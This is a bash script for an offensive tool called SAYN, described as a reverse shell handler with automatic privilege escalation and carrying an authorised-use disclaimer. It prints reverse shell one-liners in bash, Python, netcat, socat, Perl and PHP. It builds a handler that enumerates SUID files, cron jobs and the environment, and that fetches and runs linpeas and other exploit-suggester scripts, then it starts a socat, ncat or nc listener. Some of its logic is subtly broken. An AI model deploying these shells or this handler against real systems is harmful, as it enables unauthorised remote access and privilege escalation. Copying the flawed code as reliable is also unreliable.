#!/bin/bash
# SAYN - Shell Analyzer Yes Network v3.0
# Advanced Reverse Shell Handler with Auto-Privilege Escalation
# For authorized penetration testing and CTF use only

# ========================
# GLOBAL CONFIGURATION
# ========================
VERSION="3.0"
DEVELOPER="Cyber Security Research Team"
RELEASE_DATE="2025-06-15"
DEFAULT_PORT=4444
LOG_DIR="/var/log/sayn"
TEMP_DIR="/tmp/sayn_$(date +%s)"
PRIVESC_TOOLS=("linpeas.sh" "lse.sh" "linux-exploit-suggester.sh")

# ========================
# COLOR DEFINITIONS
# ========================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
UNDERLINE='\033[4m'
RESET='\033[0m'

# ========================
# UTILITY FUNCTIONS
# ========================

# Safe print function with error handling
safe_print() {
    local color="$1"
    local type="$2"
    local message="$3"
    
    # Format the output with timestamp
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local output="[${timestamp}] ${type} ${message}"
    
    # Print to terminal with colors
    printf "${color}${BOLD}%s${RESET}\n" "${output}" 2>/dev/null || true
    
    # Log to file without colors
    mkdir -p "${LOG_DIR}" 2>/dev/null
    echo "${output}" >> "${LOG_DIR}/sayn.log" 2>/dev/null || true
}

# Log different message types
log_info() {
    safe_print "${BLUE}" "[*]" "$1"
}

log_success() {
    safe_print "${GREEN}" "[+]" "$1"
}

log_warning() {
    safe_print "${YELLOW}" "[!]" "$1"
}

log_error() {
    safe_print "${RED}" "[-]" "$1"
}

# Cleanup function
cleanup() {
    log_warning "Cleaning up temporary files..."
    rm -rf "${TEMP_DIR}" 2>/dev/null
    rm -f "/tmp/sayn_shell_handler.sh" 2>/dev/null
    rm -f "/tmp/sayn_pipe" 2>/dev/null
    log_success "Cleanup completed"
    exit 0
}

# Trap signals for proper cleanup
trap cleanup SIGINT SIGTERM EXIT

# ========================
# CORE FUNCTIONS
# ========================

display_banner() {
    clear
    echo -e "${BLUE}${BOLD}"
    echo " ███████╗ █████╗ ██╗   ██╗███╗   ██╗"
    echo " ██╔════╝██╔══██╗╚██╗ ██╔╝████╗  ██║"
    echo " ███████╗███████║ ╚████╔╝ ██╔██╗ ██║"
    echo " ╚════██║██╔══██║  ╚██╔╝  ██║╚██╗██║"
    echo " ███████║██║  ██║   ██║   ██║ ╚████║"
    echo " ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝"
    echo -e "${RESET}"
    echo -e " ${YELLOW}Shell Analyzer Yes Network v${VERSION}${RESET}"
    echo -e " ${CYAN}Advanced Reverse Shell Handler with Auto-PrivEsc${RESET}"
    echo -e " ${MAGENTA}Developer: ${DEVELOPER} | Release: ${RELEASE_DATE}${RESET}"
    echo -e " ${RED}FOR AUTHORIZED TESTING ONLY - Ethical use required${RESET}\n"
}

check_dependencies() {
    local missing_critical=0
    local missing_optional=0
    
    log_info "Checking system dependencies..."
    
    declare -A tools=(
        ["bash"]="Bash shell"
        ["nc"]="Netcat"
        ["python3"]="Python 3 (optional)"
        ["script"]="Script command (optional)"
        ["socat"]="Socat (optional)"
        ["curl"]="cURL (optional)"
        ["wget"]="Wget (optional)"
    )
    
    for tool in "${!tools[@]}"; do
        if command -v "${tool}" &>/dev/null; then
            log_success "Found: ${tools[$tool]}"
        else
            if [[ "${tool}" == "bash" || "${tool}" == "nc" ]]; then
                log_error "Critical missing: ${tools[$tool]% (*)}"
                missing_critical=$((missing_critical + 1))
            else
                log_warning "Optional missing: ${tools[$tool]% (*)}"
                missing_optional=$((missing_optional + 1))
            fi
        fi
    done
    
    if [ "${missing_critical}" -gt 0 ]; then
        log_error "Critical dependencies missing. Cannot continue."
        exit 1
    fi
    
    if [ "${missing_optional}" -gt 0 ]; then
        log_warning "Some optional tools are missing. Limited functionality."
    fi
    
    log_success "Dependency check completed"
}

validate_port() {
    local port="$1"
    
    if ! [[ "${port}" =~ ^[0-9]+$ ]] || [ "${port}" -lt 1 ] || [ "${port}" -gt 65535 ]; then
        log_error "Invalid port number: ${port}. Must be 1-65535."
        return 1
    fi
    
    # Check if port is in privileged range and we have root
    if [ "${port}" -lt 1024 ] && [ "$(id -u)" -ne 0 ]; then
        log_warning "Port ${port} requires root privileges. Running as non-root may fail."
    fi
    
    # Check if port is already in use
    if ss -tuln | grep -q ":${port} "; then
        log_error "Port ${port} is already in use!"
        return 1
    fi
    
    return 0
}

generate_shell_commands() {
    local port="$1"
    local ip_addresses=($(hostname -I 2>/dev/null || ip -o -4 addr show | awk '{print $4}' | cut -d'/' -f1))
    local primary_ip="${ip_addresses[0]}"
    
    log_info "Generated reverse shell commands for port ${port}:"
    
    echo -e "\n${BLUE}${BOLD}=== BASH SHELLS ===${RESET}"
    echo -e "${GREEN}# Basic Bash:${RESET}"
    echo "bash -i >& /dev/tcp/${primary_ip}/${port} 0>&1"
    
    echo -e "\n${GREEN}# Advanced Bash:${RESET}"
    echo "exec 5<>/dev/tcp/${primary_ip}/${port}; cat <&5 | while read line; do \$line 2>&5 >&5; done"
    
    echo -e "\n${BLUE}${BOLD}=== PYTHON SHELLS ===${RESET}"
    echo -e "${GREEN}# Python 3:${RESET}"
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${primary_ip}\",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    
    echo -e "\n${BLUE}${BOLD}=== NETCAT SHELLS ===${RESET}"
    echo -e "${GREEN}# Traditional Netcat:${RESET}"
    echo "nc -e /bin/sh ${primary_ip} ${port}"
    
    echo -e "\n${GREEN}# Netcat without -e:${RESET}"
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${primary_ip} ${port} >/tmp/f"
    
    echo -e "\n${BLUE}${BOLD}=== SOCAT SHELLS ===${RESET}"
    echo -e "${GREEN}# Socat TCP:${RESET}"
    echo "socat TCP:${primary_ip}:${port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"
    
    echo -e "\n${GREEN}# Socat SSL (if available):${RESET}"
    echo "socat OPENSSL:${primary_ip}:${port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"
    
    echo -e "\n${BLUE}${BOLD}=== OTHER SHELLS ===${RESET}"
    echo -e "${GREEN}# Perl:${RESET}"
    echo "perl -e 'use Socket;\$i=\"${primary_ip}\";\$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    
    echo -e "\n${GREEN}# PHP:${RESET}"
    echo "php -r '\$sock=fsockopen(\"${primary_ip}\",${port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    
    echo -e "\n${YELLOW}Note: Some commands may need adjustment based on target environment.${RESET}"
}

create_handler_script() {
    cat > "/tmp/sayn_shell_handler.sh" << 'EOF'
#!/bin/bash
# SAYN Shell Handler v3.0
# Advanced reverse shell handler with auto-privesc

# Configuration
LOG_FILE="/tmp/sayn_shell.log"
PRIVESC_DIR="/tmp/sayn_privesc_$(date +%s)"
TOOL_TIMEOUT=300  # 5 minutes timeout for downloads

# Initialize logging
mkdir -p "$(dirname "${LOG_FILE}")"
exec > >(tee -a "${LOG_FILE}") 2>&1

# Color setup (simplified for target environment)
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
RESET='\033[0m'

# Logging functions
log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "[${timestamp}] [${level}] ${message}"
}

# Main handler function
handle_shell() {
    log "INFO" "New connection from ${SSH_CONNECTION:-UNKNOWN}"
    
    # System information gathering
    log "INFO" "Gathering system information..."
    {
        echo "=== SYSTEM INFORMATION ==="
        echo "Hostname: $(hostname 2>/dev/null || echo 'Unknown')"
        echo "User: $(id 2>/dev/null || echo 'Unknown')"
        echo "Kernel: $(uname -a 2>/dev/null || echo 'Unknown')"
        echo "Distribution: $(cat /etc/*-release 2>/dev/null || echo 'Unknown')"
        echo "CPU: $(lscpu 2>/dev/null || echo 'Unknown')"
        echo "Memory: $(free -h 2>/dev/null || echo 'Unknown')"
    } > "${PRIVESC_DIR}/system_info.txt"

    # Attempt TTY upgrade
    upgrade_shell

    # Run privilege escalation checks
    run_privesc_checks

    # Provide clean shell
    log "INFO" "Starting interactive shell"
    exec /bin/bash -i
}

# Shell upgrade function
upgrade_shell() {
    log "INFO" "Attempting shell upgrade..."
    
    # Try Python first
    if command -v python3 >/dev/null 2>&1; then
        log "INFO" "Trying Python3 pty upgrade..."
        python3 -c 'import pty; pty.spawn("/bin/bash")' && return 0
    fi

    if command -v python >/dev/null 2>&1; then
        log "INFO" "Trying Python pty upgrade..."
        python -c 'import pty; pty.spawn("/bin/bash")' && return 0
    fi

    # Try script command
    if command -v script >/dev/null 2>&1; then
        log "INFO" "Trying script command upgrade..."
        script -qc /bin/bash /dev/null && return 0
    fi

    # Try socat if available
    if command -v socat >/dev/null 2>&1; then
        log "INFO" "Trying socat upgrade..."
        socat exec:'bash -li',pty,stderr,setsid,sigint,sane && return 0
    fi

    log "WARNING" "Failed to upgrade shell. Continuing with basic shell."
    return 1
}

# Privilege escalation checks
run_privesc_checks() {
    log "INFO" "Starting privilege escalation checks..."
    mkdir -p "${PRIVESC_DIR}"
    
    # Basic system enumeration
    basic_enumeration
    
    # Try to download and run privesc tools
    download_privesc_tools
    
    log "INFO" "Privilege escalation checks completed. Results in ${PRIVESC_DIR}"
}

basic_enumeration() {
    log "INFO" "Running basic enumeration..."
    
    # SUID/SGID files
    find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null > "${PRIVESC_DIR}/suid_sgid.txt"
    
    # Writable files
    find / -type f \( -writable -o -perm -2 \) ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null > "${PRIVESC_DIR}/writable_files.txt"
    
    # Cron jobs
    crontab -l 2>/dev/null > "${PRIVESC_DIR}/cron_jobs.txt"
    ls -la /etc/cron* 2>/dev/null >> "${PRIVESC_DIR}/cron_jobs.txt"
    
    # Network information
    ip a 2>/dev/null > "${PRIVESC_DIR}/network_info.txt"
    netstat -tuln 2>/dev/null >> "${PRIVESC_DIR}/network_info.txt"
    
    # Environment variables
    env 2>/dev/null > "${PRIVESC_DIR}/environment.txt"
    
    # Installed packages
    (command -v dpkg >/dev/null && dpkg -l) || (command -v rpm >/dev/null && rpm -qa) > "${PRIVESC_DIR}/packages.txt" 2>/dev/null
}

download_privesc_tools() {
    local tools=(
        "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
        "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh"
        "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"
    )
    
    for tool_url in "${tools[@]}"; do
        local tool_name=$(basename "${tool_url}")
        log "INFO" "Downloading ${tool_name}..."
        
        if command -v curl >/dev/null 2>&1; then
            curl -sSL --connect-timeout 10 "${tool_url}" -o "${PRIVESC_DIR}/${tool_name}" && \
            chmod +x "${PRIVESC_DIR}/${tool_name}" && \
            run_tool "${PRIVESC_DIR}/${tool_name}" "${tool_name}"
        elif command -v wget >/dev/null 2>&1; then
            wget --timeout=10 -qO "${PRIVESC_DIR}/${tool_name}" "${tool_url}" && \
            chmod +x "${PRIVESC_DIR}/${tool_name}" && \
            run_tool "${PRIVESC_DIR}/${tool_name}" "${tool_name}"
        else
            log "WARNING" "Cannot download ${tool_name} - no curl/wget available"
        fi
    done
}

run_tool() {
    local tool_path="$1"
    local tool_name="$2"
    
    log "INFO" "Running ${tool_name}..."
    timeout "${TOOL_TIMEOUT}" "${tool_path}" > "${PRIVESC_DIR}/${tool_name}_output.txt" 2>&1
}

# Main execution
mkdir -p "${PRIVESC_DIR}"
handle_shell
EOF

    chmod +x "/tmp/sayn_shell_handler.sh"
}

start_listener() {
    local port="$1"
    
    log_info "Starting listener on port ${port}..."
    
    # Determine the best available listener tool
    if command -v socat >/dev/null 2>&1; then
        log_success "Using socat for advanced listener"
        socat TCP-LISTEN:"${port}",reuseaddr,fork EXEC:"/tmp/sayn_shell_handler.sh",pty,stderr,sigint,sane
    elif command -v ncat >/dev/null 2>&1; then
        log_success "Using ncat for listener"
        ncat -lvnp "${port}" -e "/tmp/sayn_shell_handler.sh" --allow "${ip_addresses[0]}"
    elif command -v nc >/dev/null 2>&1; then
        # Check netcat version capabilities
        if nc -h 2>&1 | grep -q -- "-e"; then
            log_success "Using traditional netcat with -e support"
            nc -lvnp "${port}" -e "/tmp/sayn_shell_handler.sh"
        else
            log_warning "Using netcat without -e support (limited functionality)"
            rm -f /tmp/sayn_pipe
            mkfifo /tmp/sayn_pipe
            cat /tmp/sayn_pipe | "/tmp/sayn_shell_handler.sh" 2>&1 | nc -lvnp "${port}" > /tmp/sayn_pipe
        fi
    else
        log_error "No suitable listener tool found (tried socat, ncat, nc)"
        return 1
    fi
}

show_help() {
    echo -e "${BLUE}${BOLD}SAYN - Shell Analyzer Yes Network v${VERSION}${RESET}"
    echo -e "${YELLOW}Usage:${RESET} $0 [OPTIONS]"
    echo ""
    echo -e "${GREEN}Options:${RESET}"
    echo "  -p, --port PORT     Port to listen on (default: ${DEFAULT_PORT})"
    echo "  -i, --interface     Specify network interface"
    echo "  -v, --verbose       Enable verbose output"
    echo "  -h, --help          Show this help message"
    echo "  --version           Show version information"
    echo ""
    echo -e "${CYAN}Examples:${RESET}"
    echo "  $0 -p 4444          Listen on port 4444"
    echo "  $0 --interface eth0  Listen on specific interface"
    echo ""
    echo -e "${RED}Legal Disclaimer:${RESET}"
    echo "This tool is for authorized security testing and educational purposes only."
    echo "Unauthorized use is strictly prohibited."
}

show_version() {
    echo -e "${BLUE}${BOLD}SAYN - Shell Analyzer Yes Network${RESET}"
    echo -e "${GREEN}Version:${RESET} ${VERSION}"
    echo -e "${CYAN}Release Date:${RESET} ${RELEASE_DATE}"
    echo -e "${YELLOW}Developer:${RESET} ${DEVELOPER}"
}

# ========================
# MAIN PROGRAM
# ========================

main() {
    local port=""
    local interface=""
    local verbose=false
    
    # Parse command line arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -p|--port)
                port="$2"
                shift 2
                ;;
            -i|--interface)
                interface="$2"
                shift 2
                ;;
            -v|--verbose)
                verbose=true
                shift
                ;;
            -h|--help)
                show_help
                exit 0
                ;;
            --version)
                show_version
                exit 0
                ;;
            *)
                log_error "Unknown option: $1"
                show_help
                exit 1
                ;;
        esac
    done

    display_banner
    check_dependencies
    
    # Set default port if not specified
    if [ -z "${port}" ]; then
        read -p "$(echo -e ${YELLOW}"[?] Enter listener port [${DEFAULT_PORT}]: "${RESET})" port
        port=${port:-${DEFAULT_PORT}}
    fi
    
    # Validate port
    if ! validate_port "${port}"; then
        exit 1
    fi
    
    # Create handler script
    create_handler_script
    
    # Generate shell commands for the target
    generate_shell_commands "${port}"
    
    # Start the listener
    log_success "Starting reverse shell handler on port ${port}"
    log_warning "Waiting for incoming connection... (Ctrl+C to stop)"
    
    if ! start_listener "${port}"; then
        log_error "Failed to start listener"
        exit 1
    fi
}

# Start the program
main "$@"
